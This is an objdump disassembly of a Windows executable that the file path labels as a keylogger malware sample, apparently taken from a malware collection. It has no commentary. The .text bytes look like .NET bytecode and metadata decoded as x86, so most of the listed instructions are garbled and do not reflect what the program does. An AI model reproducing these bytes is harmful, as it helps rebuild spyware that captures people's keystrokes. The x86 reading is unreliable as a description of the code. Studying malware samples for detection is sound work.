
malware_samples/keylogger/b73eb27d97537767ccabe4ca40b63e9043cb5d1c6a9c13900e3e240a5fd19263.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	58                   	pop    %eax
  402001:	39 00                	cmp    %eax,(%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 c4 24 00       	add    $0x24c400,%eax
  402013:	00 28                	add    %ch,(%eax)
  402015:	13 00                	adc    (%eax),%eax
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	8a 00                	mov    (%eax),%al
  402052:	7e 0c                	jle    0x402060
  402054:	00 00                	add    %al,(%eax)
  402056:	04 28                	add    $0x28,%al
  402058:	04 00                	add    $0x0,%al
  40205a:	00 06                	add    %al,(%esi)
  40205c:	80 0b 00             	orb    $0x0,(%ebx)
  40205f:	00 04 28             	add    %al,(%eax,%ebp,1)
  402062:	0f 00 00             	sldt   (%eax)
  402065:	0a 00                	or     (%eax),%al
  402067:	7e 0b                	jle    0x402074
  402069:	00 00                	add    %al,(%eax)
  40206b:	04 28                	add    $0x28,%al
  40206d:	07                   	pop    %es
  40206e:	00 00                	add    %al,(%eax)
  402070:	06                   	push   %es
  402071:	26 2a 00             	sub    %es:(%eax),%al
  402074:	1b 30                	sbb    (%eax),%esi
  402076:	04 00                	add    $0x0,%al
  402078:	18 02                	sbb    %al,(%edx)
  40207a:	00 00                	add    %al,(%eax)
  40207c:	01 00                	add    %eax,(%eax)
  40207e:	00 11                	add    %dl,(%ecx)
  402080:	00 7e 0d             	add    %bh,0xd(%esi)
  402083:	00 00                	add    %al,(%eax)
  402085:	04 6f                	add    $0x6f,%al
  402087:	10 00                	adc    %al,(%eax)
  402089:	00 0a                	add    %cl,(%edx)
  40208b:	16                   	push   %ss
  40208c:	fe 04 16             	incb   (%esi,%edx,1)
  40208f:	fe 01                	incb   (%ecx)
  402091:	0b 07                	or     (%edi),%eax
  402093:	2c 2b                	sub    $0x2b,%al
  402095:	00 72 01             	add    %dh,0x1(%edx)
  402098:	00 00                	add    %al,(%eax)
  40209a:	70 17                	jo     0x4020b3
  40209c:	73 11                	jae    0x4020af
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4020a3:	7e 0d                	jle    0x4020b2
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	04 6f                	add    $0x6f,%al
  4020a9:	12 00                	adc    (%eax),%al
  4020ab:	00 0a                	add    %cl,(%edx)
  4020ad:	00 08                	add    %cl,(%eax)
  4020af:	6f                   	outsl  %ds:(%esi),(%dx)
  4020b0:	13 00                	adc    (%eax),%eax
  4020b2:	00 0a                	add    %cl,(%edx)
  4020b4:	00 72 33             	add    %dh,0x33(%edx)
  4020b7:	00 00                	add    %al,(%eax)
  4020b9:	70 80                	jo     0x40203b
  4020bb:	0d 00 00 04 00       	or     $0x40000,%eax
  4020c0:	72 01                	jb     0x4020c3
  4020c2:	00 00                	add    %al,(%eax)
  4020c4:	70 73                	jo     0x402139
  4020c6:	14 00                	adc    $0x0,%al
  4020c8:	00 0a                	add    %cl,(%edx)
  4020ca:	0a 06                	or     (%esi),%al
  4020cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4020cd:	15 00 00 0a 2c       	adc    $0x2c0a0000,%eax
  4020d2:	13 06                	adc    (%esi),%eax
  4020d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4020d5:	16                   	push   %ss
  4020d6:	00 00                	add    %al,(%eax)
  4020d8:	0a 20                	or     (%eax),%ah
  4020da:	d0 07                	rolb   $1,(%edi)
  4020dc:	00 00                	add    %al,(%eax)
  4020de:	6a fe                	push   $0xfffffffe
  4020e0:	04 16                	add    $0x16,%al
  4020e2:	fe 01                	incb   (%ecx)
  4020e4:	2b 01                	sub    (%ecx),%eax
  4020e6:	16                   	push   %ss
  4020e7:	0d 09 2c 5d 00       	or     $0x5d2c09,%eax
  4020ec:	00 06                	add    %al,(%esi)
  4020ee:	72 35                	jb     0x402125
  4020f0:	00 00                	add    %al,(%eax)
  4020f2:	70 17                	jo     0x40210b
  4020f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f5:	17                   	pop    %ss
  4020f6:	00 00                	add    %al,(%eax)
  4020f8:	0a 26                	or     (%esi),%ah
  4020fa:	06                   	push   %es
  4020fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4020fc:	18 00                	sbb    %al,(%eax)
  4020fe:	00 0a                	add    %cl,(%edx)
  402100:	00 14 fe             	add    %dl,(%esi,%edi,8)
  402103:	06                   	push   %es
  402104:	03 00                	add    (%eax),%eax
  402106:	00 06                	add    %al,(%esi)
  402108:	73 19                	jae    0x402123
  40210a:	00 00                	add    %al,(%eax)
  40210c:	0a 73 1a             	or     0x1a(%ebx),%dh
  40210f:	00 00                	add    %al,(%eax)
  402111:	0a 13                	or     (%ebx),%dl
  402113:	04 28                	add    $0x28,%al
  402115:	1b 00                	sbb    (%eax),%eax
  402117:	00 0a                	add    %cl,(%edx)
  402119:	72 77                	jb     0x402192
  40211b:	00 00                	add    %al,(%eax)
  40211d:	70 6f                	jo     0x40218e
  40211f:	1c 00                	sbb    $0x0,%al
  402121:	00 0a                	add    %cl,(%edx)
  402123:	00 11                	add    %dl,(%ecx)
  402125:	04 6f                	add    $0x6f,%al
  402127:	1d 00 00 0a 00       	sbb    $0xa0000,%eax
  40212c:	00 de                	add    %bl,%dh
  40212e:	18 13                	sbb    %dl,(%ebx)
  402130:	05 00 28 1b 00       	add    $0x1b2800,%eax
  402135:	00 0a                	add    %cl,(%edx)
  402137:	11 05 6f 1e 00 00    	adc    %eax,0x1e6f
  40213d:	0a 6f 1c             	or     0x1c(%edi),%ch
  402140:	00 00                	add    %al,(%eax)
  402142:	0a 00                	or     (%eax),%al
  402144:	00 de                	add    %bl,%dh
  402146:	00 00                	add    %al,(%eax)
  402148:	02 16                	add    (%esi),%dl
  40214a:	32 12                	xor    (%edx),%dl
  40214c:	03 7e 0a             	add    0xa(%esi),%edi
  40214f:	00 00                	add    %al,(%eax)
  402151:	04 28                	add    $0x28,%al
  402153:	1f                   	pop    %ds
  402154:	00 00                	add    %al,(%eax)
  402156:	0a 28                	or     (%eax),%ch
  402158:	20 00                	and    %al,(%eax)
  40215a:	00 0a                	add    %cl,(%edx)
  40215c:	2b 01                	sub    (%ecx),%eax
  40215e:	16                   	push   %ss
  40215f:	13 06                	adc    (%esi),%eax
  402161:	11 06                	adc    %eax,(%esi)
  402163:	39 1c 01             	cmp    %ebx,(%ecx,%eax,1)
  402166:	00 00                	add    %al,(%eax)
  402168:	00 04 28             	add    %al,(%eax,%ebp,1)
  40216b:	21 00                	and    %eax,(%eax)
  40216d:	00 0a                	add    %cl,(%edx)
  40216f:	13 07                	adc    (%edi),%eax
  402171:	11 07                	adc    %eax,(%edi)
  402173:	13 09                	adc    (%ecx),%ecx
  402175:	12 09                	adc    (%ecx),%cl
  402177:	fe                   	(bad)
  402178:	16                   	push   %ss
  402179:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  40217e:	22 00                	and    (%eax),%al
  402180:	00 0a                	add    %cl,(%edx)
  402182:	72 9d                	jb     0x402121
  402184:	00 00                	add    %al,(%eax)
  402186:	70 28                	jo     0x4021b0
  402188:	23 00                	and    (%eax),%eax
  40218a:	00 0a                	add    %cl,(%edx)
  40218c:	13 08                	adc    (%eax),%ecx
  40218e:	11 08                	adc    %ecx,(%eax)
  402190:	2c 2b                	sub    $0x2b,%al
  402192:	00 28                	add    %ch,(%eax)
  402194:	1b 00                	sbb    (%eax),%eax
  402196:	00 0a                	add    %cl,(%edx)
  402198:	72 b1                	jb     0x40214b
  40219a:	00 00                	add    %al,(%eax)
  40219c:	70 6f                	jo     0x40220d
  40219e:	12 00                	adc    (%eax),%al
  4021a0:	00 0a                	add    %cl,(%edx)
  4021a2:	00 7e 0d             	add    %bh,0xd(%esi)
  4021a5:	00 00                	add    %al,(%eax)
  4021a7:	04 72                	add    $0x72,%al
  4021a9:	b1 00                	mov    $0x0,%cl
  4021ab:	00 70 28             	add    %dh,0x28(%eax)
  4021ae:	24 00                	and    $0x0,%al
  4021b0:	00 0a                	add    %cl,(%edx)
  4021b2:	80 0d 00 00 04 00 38 	orb    $0x38,0x40000
  4021b9:	c6 00 00             	movb   $0x0,(%eax)
  4021bc:	00 11                	add    %dl,(%ecx)
  4021be:	07                   	pop    %es
  4021bf:	13 09                	adc    (%ecx),%ecx
  4021c1:	12 09                	adc    (%ecx),%cl
  4021c3:	fe                   	(bad)
  4021c4:	16                   	push   %ss
  4021c5:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4021ca:	22 00                	and    (%eax),%al
  4021cc:	00 0a                	add    %cl,(%edx)
  4021ce:	72 b5                	jb     0x402185
  4021d0:	00 00                	add    %al,(%eax)
  4021d2:	70 28                	jo     0x4021fc
  4021d4:	23 00                	and    (%eax),%eax
  4021d6:	00 0a                	add    %cl,(%edx)
  4021d8:	13 0a                	adc    (%edx),%ecx
  4021da:	11 0a                	adc    %ecx,(%edx)
  4021dc:	2c 28                	sub    $0x28,%al
  4021de:	00 28                	add    %ch,(%eax)
  4021e0:	1b 00                	sbb    (%eax),%eax
  4021e2:	00 0a                	add    %cl,(%edx)
  4021e4:	72 c7                	jb     0x4021ad
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	70 6f                	jo     0x402259
  4021ea:	12 00                	adc    (%eax),%al
  4021ec:	00 0a                	add    %cl,(%edx)
  4021ee:	00 7e 0d             	add    %bh,0xd(%esi)
  4021f1:	00 00                	add    %al,(%eax)
  4021f3:	04 72                	add    $0x72,%al
  4021f5:	c7 00 00 70 28 24    	movl   $0x24287000,(%eax)
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	0a 80 0d 00 00 04    	or     0x400000d(%eax),%al
  402203:	00 2b                	add    %ch,(%ebx)
  402205:	7d 11                	jge    0x402218
  402207:	07                   	pop    %es
  402208:	13 09                	adc    (%ecx),%ecx
  40220a:	12 09                	adc    (%ecx),%cl
  40220c:	fe                   	(bad)
  40220d:	16                   	push   %ss
  40220e:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  402213:	22 00                	and    (%eax),%al
  402215:	00 0a                	add    %cl,(%edx)
  402217:	72 cb                	jb     0x4021e4
  402219:	00 00                	add    %al,(%eax)
  40221b:	70 28                	jo     0x402245
  40221d:	23 00                	and    (%eax),%eax
  40221f:	00 0a                	add    %cl,(%edx)
  402221:	13 0b                	adc    (%ebx),%ecx
  402223:	11 0b                	adc    %ecx,(%ebx)
  402225:	2c 28                	sub    $0x28,%al
  402227:	00 28                	add    %ch,(%eax)
  402229:	1b 00                	sbb    (%eax),%eax
  40222b:	00 0a                	add    %cl,(%edx)
  40222d:	72 d7                	jb     0x402206
  40222f:	00 00                	add    %al,(%eax)
  402231:	70 6f                	jo     0x4022a2
  402233:	12 00                	adc    (%eax),%al
  402235:	00 0a                	add    %cl,(%edx)
  402237:	00 7e 0d             	add    %bh,0xd(%esi)
  40223a:	00 00                	add    %al,(%eax)
  40223c:	04 72                	add    $0x72,%al
  40223e:	d7                   	xlat   %ds:(%ebx)
  40223f:	00 00                	add    %al,(%eax)
  402241:	70 28                	jo     0x40226b
  402243:	24 00                	and    $0x0,%al
  402245:	00 0a                	add    %cl,(%edx)
  402247:	80 0d 00 00 04 00 2b 	orb    $0x2b,0x40000
  40224e:	34 00                	xor    $0x0,%al
  402250:	28 1b                	sub    %bl,(%ebx)
  402252:	00 00                	add    %al,(%eax)
  402254:	0a 11                	or     (%ecx),%dl
  402256:	07                   	pop    %es
  402257:	8c 15 00 00 01 6f    	mov    %ss,0x6f010000
  40225d:	25 00 00 0a 00       	and    $0xa0000,%eax
  402262:	7e 0d                	jle    0x402271
  402264:	00 00                	add    %al,(%eax)
  402266:	04 11                	add    $0x11,%al
  402268:	07                   	pop    %es
  402269:	13 09                	adc    (%ecx),%ecx
  40226b:	12 09                	adc    (%ecx),%cl
  40226d:	fe                   	(bad)
  40226e:	16                   	push   %ss
  40226f:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  402274:	22 00                	and    (%eax),%al
  402276:	00 0a                	add    %cl,(%edx)
  402278:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40227b:	00 0a                	add    %cl,(%edx)
  40227d:	80 0d 00 00 04 00 00 	orb    $0x0,0x40000
  402284:	7e 26                	jle    0x4022ac
  402286:	00 00                	add    %al,(%eax)
  402288:	0a 02                	or     (%edx),%al
  40228a:	03 04 28             	add    (%eax,%ebp,1),%eax
  40228d:	05 00 00 06 13       	add    $0x13060000,%eax
  402292:	0c 2b                	or     $0x2b,%al
  402294:	00 11                	add    %dl,(%ecx)
  402296:	0c 2a                	or     $0x2a,%al
  402298:	01 10                	add    %edx,(%eax)
  40229a:	00 00                	add    %al,(%eax)
  40229c:	00 00                	add    %al,(%eax)
  40229e:	6c                   	insb   (%dx),%es:(%edi)
  40229f:	00 43 af             	add    %al,-0x51(%ebx)
  4022a2:	00 18                	add    %bl,(%eax)
  4022a4:	14 00                	adc    $0x0,%al
  4022a6:	00 01                	add    %al,(%ecx)
  4022a8:	1b 30                	sbb    (%eax),%esi
  4022aa:	05 00 6f 01 00       	add    $0x16f00,%eax
  4022af:	00 02                	add    %al,(%edx)
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	11 00                	adc    %eax,(%eax)
  4022b5:	00 72 35             	add    %dh,0x35(%edx)
  4022b8:	00 00                	add    %al,(%eax)
  4022ba:	70 73                	jo     0x40232f
  4022bc:	27                   	daa
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	0a 0a                	or     (%edx),%cl
  4022c1:	06                   	push   %es
  4022c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022c3:	28 00                	sub    %al,(%eax)
  4022c5:	00 0a                	add    %cl,(%edx)
  4022c7:	0b 06                	or     (%esi),%eax
  4022c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ca:	29 00                	sub    %eax,(%eax)
  4022cc:	00 0a                	add    %cl,(%edx)
  4022ce:	00 72 db             	add    %dh,-0x25(%edx)
  4022d1:	00 00                	add    %al,(%eax)
  4022d3:	70 73                	jo     0x402348
  4022d5:	2a 00                	sub    (%eax),%al
  4022d7:	00 0a                	add    %cl,(%edx)
  4022d9:	25 20 4b 02 00       	and    $0x24b20,%eax
  4022de:	00 6f 2b             	add    %ch,0x2b(%edi)
  4022e1:	00 00                	add    %al,(%eax)
  4022e3:	0a 00                	or     (%eax),%al
  4022e5:	25 16 6f 2c 00       	and    $0x2c6f16,%eax
  4022ea:	00 0a                	add    %cl,(%edx)
  4022ec:	00 25 16 6f 2d 00    	add    %ah,0x2d6f16
  4022f2:	00 0a                	add    %cl,(%edx)
  4022f4:	00 25 72 f9 00 00    	add    %ah,0xf972
  4022fa:	70 72                	jo     0x40236e
  4022fc:	2f                   	das
  4022fd:	01 00                	add    %eax,(%eax)
  4022ff:	70 73                	jo     0x402374
  402301:	2e 00 00             	add    %al,%cs:(%eax)
  402304:	0a 6f 2f             	or     0x2f(%edi),%ch
  402307:	00 00                	add    %al,(%eax)
  402309:	0a 00                	or     (%eax),%al
  40230b:	25 17 6f 30 00       	and    $0x306f17,%eax
  402310:	00 0a                	add    %cl,(%edx)
  402312:	00 0c 73             	add    %cl,(%ebx,%esi,2)
  402315:	31 00                	xor    %eax,(%eax)
  402317:	00 0a                	add    %cl,(%edx)
  402319:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40231c:	04 72                	add    $0x72,%al
  40231e:	f9                   	stc
  40231f:	00 00                	add    %al,(%eax)
  402321:	70 73                	jo     0x402396
  402323:	32 00                	xor    (%eax),%al
  402325:	00 0a                	add    %cl,(%edx)
  402327:	6f                   	outsl  %ds:(%esi),(%dx)
  402328:	33 00                	xor    (%eax),%eax
  40232a:	00 0a                	add    %cl,(%edx)
  40232c:	00 11                	add    %dl,(%ecx)
  40232e:	04 1d                	add    $0x1d,%al
  402330:	8d 21                	lea    (%ecx),%esp
  402332:	00 00                	add    %al,(%eax)
  402334:	01 25 16 28 34 00    	add    %esp,0x342816
  40233a:	00 0a                	add    %cl,(%edx)
  40233c:	a2 25 17 72 41       	mov    %al,0x41721725
  402341:	01 00                	add    %eax,(%eax)
  402343:	70 a2                	jo     0x4022e7
  402345:	25 18 28 35 00       	and    $0x352818,%eax
  40234a:	00 0a                	add    %cl,(%edx)
  40234c:	13 05 12 05 28 36    	adc    0x36280512,%eax
  402352:	00 00                	add    %al,(%eax)
  402354:	0a 13                	or     (%ebx),%dl
  402356:	06                   	push   %es
  402357:	12 06                	adc    (%esi),%al
  402359:	28 37                	sub    %dh,(%edi)
  40235b:	00 00                	add    %al,(%eax)
  40235d:	0a a2 25 19 72 b1    	or     -0x4e8de6db(%edx),%ah
  402363:	00 00                	add    %al,(%eax)
  402365:	70 a2                	jo     0x402309
  402367:	25 1a 28 35 00       	and    $0x35281a,%eax
  40236c:	00 0a                	add    %cl,(%edx)
  40236e:	13 05 12 05 28 38    	adc    0x38280512,%eax
  402374:	00 00                	add    %al,(%eax)
  402376:	0a 13                	or     (%ebx),%dl
  402378:	06                   	push   %es
  402379:	12 06                	adc    (%esi),%al
  40237b:	28 37                	sub    %dh,(%edi)
  40237d:	00 00                	add    %al,(%eax)
  40237f:	0a a2 25 1b 72 b1    	or     -0x4e8de4db(%edx),%ah
  402385:	00 00                	add    %al,(%eax)
  402387:	70 a2                	jo     0x40232b
  402389:	25 1c 28 35 00       	and    $0x35281c,%eax
  40238e:	00 0a                	add    %cl,(%edx)
  402390:	13 05 12 05 28 39    	adc    0x39280512,%eax
  402396:	00 00                	add    %al,(%eax)
  402398:	0a 13                	or     (%ebx),%dl
  40239a:	06                   	push   %es
  40239b:	12 06                	adc    (%esi),%al
  40239d:	28 37                	sub    %dh,(%edi)
  40239f:	00 00                	add    %al,(%eax)
  4023a1:	0a a2 28 3a 00 00    	or     0x3a28(%edx),%ah
  4023a7:	0a 6f 3b             	or     0x3b(%edi),%ch
  4023aa:	00 00                	add    %al,(%eax)
  4023ac:	0a 00                	or     (%eax),%al
  4023ae:	11 04 07             	adc    %eax,(%edi,%eax,1)
  4023b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b2:	3c 00                	cmp    $0x0,%al
  4023b4:	00 0a                	add    %cl,(%edx)
  4023b6:	00 11                	add    %dl,(%ecx)
  4023b8:	04 16                	add    $0x16,%al
  4023ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4023bb:	3d 00 00 0a 00       	cmp    $0xa0000,%eax
  4023c0:	11 04 0d 17 13 07 00 	adc    %eax,0x71317(,%ecx,1)
  4023c7:	72 35                	jb     0x4023fe
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	70 72                	jo     0x40243f
  4023cd:	49                   	dec    %ecx
  4023ce:	01 00                	add    %eax,(%eax)
  4023d0:	70 73                	jo     0x402445
  4023d2:	3e 00 00             	add    %al,%ds:(%eax)
  4023d5:	0a 13                	or     (%ebx),%dl
  4023d7:	08 09                	or     %cl,(%ecx)
  4023d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4023da:	3f                   	aas
  4023db:	00 00                	add    %al,(%eax)
  4023dd:	0a 11                	or     (%ecx),%dl
  4023df:	08 6f 40             	or     %ch,0x40(%edi)
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	0a 00                	or     (%eax),%al
  4023e6:	00 09                	add    %cl,(%ecx)
  4023e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e9:	41                   	inc    %ecx
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	0a 72 5f             	or     0x5f(%edx),%dh
  4023ef:	01 00                	add    %eax,(%eax)
  4023f1:	70 6f                	jo     0x402462
  4023f3:	42                   	inc    %edx
  4023f4:	00 00                	add    %al,(%eax)
  4023f6:	0a 00                	or     (%eax),%al
  4023f8:	08 09                	or     %cl,(%ecx)
  4023fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4023fb:	43                   	inc    %ebx
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	0a 00                	or     (%eax),%al
  402400:	09 6f 44             	or     %ebp,0x44(%edi)
  402403:	00 00                	add    %al,(%eax)
  402405:	0a 00                	or     (%eax),%al
  402407:	00 de                	add    %bl,%dh
  402409:	18 13                	sbb    %dl,(%ebx)
  40240b:	09 00                	or     %eax,(%eax)
  40240d:	28 1b                	sub    %bl,(%ebx)
  40240f:	00 00                	add    %al,(%eax)
  402411:	0a 11                	or     (%ecx),%dl
  402413:	09 6f 1e             	or     %ebp,0x1e(%edi)
  402416:	00 00                	add    %al,(%eax)
  402418:	0a 6f 1c             	or     0x1c(%edi),%ch
  40241b:	00 00                	add    %al,(%eax)
  40241d:	0a 00                	or     (%eax),%al
  40241f:	00 de                	add    %bl,%dh
  402421:	00 2a                	add    %ch,(%edx)
  402423:	00 41 1c             	add    %al,0x1c(%ecx)
  402426:	00 00                	add    %al,(%eax)
  402428:	00 00                	add    %al,(%eax)
  40242a:	00 00                	add    %al,(%eax)
  40242c:	01 00                	add    %eax,(%eax)
  40242e:	00 00                	add    %al,(%eax)
  402430:	55                   	push   %ebp
  402431:	01 00                	add    %eax,(%eax)
  402433:	00 56 01             	add    %dl,0x1(%esi)
  402436:	00 00                	add    %al,(%eax)
  402438:	18 00                	sbb    %al,(%eax)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	14 00                	adc    $0x0,%al
  40243e:	00 01                	add    %al,(%ecx)
  402440:	13 30                	adc    (%eax),%esi
  402442:	04 00                	add    $0x0,%al
  402444:	34 00                	xor    $0x0,%al
  402446:	00 00                	add    %al,(%eax)
  402448:	03 00                	add    (%eax),%eax
  40244a:	00 11                	add    %dl,(%ecx)
  40244c:	00 28                	add    %ch,(%eax)
  40244e:	45                   	inc    %ebp
  40244f:	00 00                	add    %al,(%eax)
  402451:	0a 0a                	or     (%edx),%cl
  402453:	06                   	push   %es
  402454:	6f                   	outsl  %ds:(%esi),(%dx)
  402455:	46                   	inc    %esi
  402456:	00 00                	add    %al,(%eax)
  402458:	0a 0b                	or     (%ebx),%cl
  40245a:	07                   	pop    %es
  40245b:	6f                   	outsl  %ds:(%esi),(%dx)
  40245c:	47                   	inc    %edi
  40245d:	00 00                	add    %al,(%eax)
  40245f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402462:	28 08                	sub    %cl,(%eax)
  402464:	00 00                	add    %al,(%eax)
  402466:	06                   	push   %es
  402467:	0d 7e 09 00 00       	or     $0x97e,%eax
  40246c:	04 7e                	add    $0x7e,%al
  40246e:	0c 00                	or     $0x0,%al
  402470:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402473:	16                   	push   %ss
  402474:	28 06                	sub    %al,(%esi)
  402476:	00 00                	add    %al,(%eax)
  402478:	06                   	push   %es
  402479:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40247c:	00 11                	add    %dl,(%ecx)
  40247e:	04 2a                	add    $0x2a,%al
  402480:	22 02                	and    (%edx),%al
  402482:	28 48 00             	sub    %cl,0x0(%eax)
  402485:	00 0a                	add    %cl,(%edx)
  402487:	00 2a                	add    %ch,(%edx)
  402489:	de 1f                	ficomps (%edi)
  40248b:	0d 80 09 00 00       	or     $0x980,%eax
  402490:	04 20                	add    $0x20,%al
  402492:	00 01                	add    %al,(%ecx)
  402494:	00 00                	add    %al,(%eax)
  402496:	80 0a 00             	orb    $0x0,(%edx)
  402499:	00 04 7e             	add    %al,(%esi,%edi,2)
  40249c:	26 00 00             	add    %al,%es:(%eax)
  40249f:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  4024a5:	14 fe                	adc    $0xfe,%al
  4024a7:	06                   	push   %es
  4024a8:	02 00                	add    (%eax),%al
  4024aa:	00 06                	add    %al,(%esi)
  4024ac:	73 0b                	jae    0x4024b9
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	06                   	push   %es
  4024b1:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4024b5:	04 72                	add    $0x72,%al
  4024b7:	33 00                	xor    (%eax),%eax
  4024b9:	00 70 80             	add    %dh,-0x80(%eax)
  4024bc:	0d 00 00 04 2a       	or     $0x2a040000,%eax
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	00 42 53             	add    %al,0x53(%edx)
  4024c6:	4a                   	dec    %edx
  4024c7:	42                   	inc    %edx
  4024c8:	01 00                	add    %eax,(%eax)
  4024ca:	01 00                	add    %eax,(%eax)
  4024cc:	00 00                	add    %al,(%eax)
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	0c 00                	or     $0x0,%al
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	76 34                	jbe    0x40250a
  4024d6:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4024d9:	33 30                	xor    (%eax),%esi
  4024db:	33 31                	xor    (%ecx),%esi
  4024dd:	39 00                	cmp    %eax,(%eax)
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 05 00 6c 00 00    	add    %al,0x6c00
  4024e7:	00 18                	add    %bl,(%eax)
  4024e9:	06                   	push   %es
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	23 7e 00             	and    0x0(%esi),%edi
  4024ef:	00 84 06 00 00 cc 07 	add    %al,0x7cc0000(%esi,%eax,1)
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	23 53 74             	and    0x74(%ebx),%edx
  4024fb:	72 69                	jb     0x402566
  4024fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4024fe:	67 73 00             	addr16 jae 0x402501
  402501:	00 00                	add    %al,(%eax)
  402503:	00 50 0e             	add    %dl,0xe(%eax)
  402506:	00 00                	add    %al,(%eax)
  402508:	98                   	cwtl
  402509:	01 00                	add    %eax,(%eax)
  40250b:	00 23                	add    %ah,(%ebx)
  40250d:	55                   	push   %ebp
  40250e:	53                   	push   %ebx
  40250f:	00 e8                	add    %ch,%al
  402511:	0f 00 00             	sldt   (%eax)
  402514:	10 00                	adc    %al,(%eax)
  402516:	00 00                	add    %al,(%eax)
  402518:	23 47 55             	and    0x55(%edi),%eax
  40251b:	49                   	dec    %ecx
  40251c:	44                   	inc    %esp
  40251d:	00 00                	add    %al,(%eax)
  40251f:	00 f8                	add    %bh,%al
  402521:	0f 00 00             	sldt   (%eax)
  402524:	30 03                	xor    %al,(%ebx)
  402526:	00 00                	add    %al,(%eax)
  402528:	23 42 6c             	and    0x6c(%edx),%eax
  40252b:	6f                   	outsl  %ds:(%esi),(%dx)
  40252c:	62 00                	bound  %eax,(%eax)
  40252e:	00 00                	add    %al,(%eax)
  402530:	00 00                	add    %al,(%eax)
  402532:	00 00                	add    %al,(%eax)
  402534:	02 00                	add    (%eax),%al
  402536:	00 01                	add    %al,(%ecx)
  402538:	57                   	push   %edi
  402539:	1d 02 1c 09 02       	sbb    $0x2091c02,%eax
  40253e:	00 00                	add    %al,(%eax)
  402540:	00 fa                	add    %bh,%dl
  402542:	01 33                	add    %esi,(%ebx)
  402544:	00 16                	add    %dl,(%esi)
  402546:	00 00                	add    %al,(%eax)
  402548:	01 00                	add    %eax,(%eax)
  40254a:	00 00                	add    %al,(%eax)
  40254c:	31 00                	xor    %eax,(%eax)
  40254e:	00 00                	add    %al,(%eax)
  402550:	03 00                	add    (%eax),%eax
  402552:	00 00                	add    %al,(%eax)
  402554:	0d 00 00 00 0e       	or     $0xe000000,%eax
  402559:	00 00                	add    %al,(%eax)
  40255b:	00 1a                	add    %bl,(%edx)
  40255d:	00 00                	add    %al,(%eax)
  40255f:	00 48 00             	add    %cl,0x0(%eax)
  402562:	00 00                	add    %al,(%eax)
  402564:	08 00                	or     %al,(%eax)
  402566:	00 00                	add    %al,(%eax)
  402568:	0e                   	push   %cs
  402569:	00 00                	add    %al,(%eax)
  40256b:	00 03                	add    %al,(%ebx)
  40256d:	00 00                	add    %al,(%eax)
  40256f:	00 02                	add    %al,(%edx)
  402571:	00 00                	add    %al,(%eax)
  402573:	00 01                	add    %al,(%ecx)
  402575:	00 00                	add    %al,(%eax)
  402577:	00 04 00             	add    %al,(%eax,%eax,1)
  40257a:	00 00                	add    %al,(%eax)
  40257c:	01 00                	add    %eax,(%eax)
  40257e:	00 00                	add    %al,(%eax)
  402580:	03 00                	add    (%eax),%eax
  402582:	00 00                	add    %al,(%eax)
  402584:	01 00                	add    %eax,(%eax)
  402586:	00 00                	add    %al,(%eax)
  402588:	00 00                	add    %al,(%eax)
  40258a:	cc                   	int3
  40258b:	03 01                	add    (%ecx),%eax
  40258d:	00 00                	add    %al,(%eax)
  40258f:	00 00                	add    %al,(%eax)
  402591:	00 06                	add    %al,(%esi)
  402593:	00 41 03             	add    %al,0x3(%ecx)
  402596:	22 06                	and    (%esi),%al
  402598:	06                   	push   %es
  402599:	00 ae 03 22 06 06    	add    %ch,0x6062203(%esi)
  40259f:	00 75 02             	add    %dh,0x2(%ebp)
  4025a2:	f0 05 0f 00 42 06    	lock add $0x642000f,%eax
  4025a8:	00 00                	add    %al,(%eax)
  4025aa:	06                   	push   %es
  4025ab:	00 9d 02 26 05 06    	add    %bl,0x6052602(%ebp)
  4025b1:	00 24 03             	add    %ah,(%ebx,%eax,1)
  4025b4:	26 05 06 00 05 03    	es add $0x3050006,%eax
  4025ba:	26 05 06 00 95 03    	es add $0x3950006,%eax
  4025c0:	26 05 06 00 61 03    	es add $0x3610006,%eax
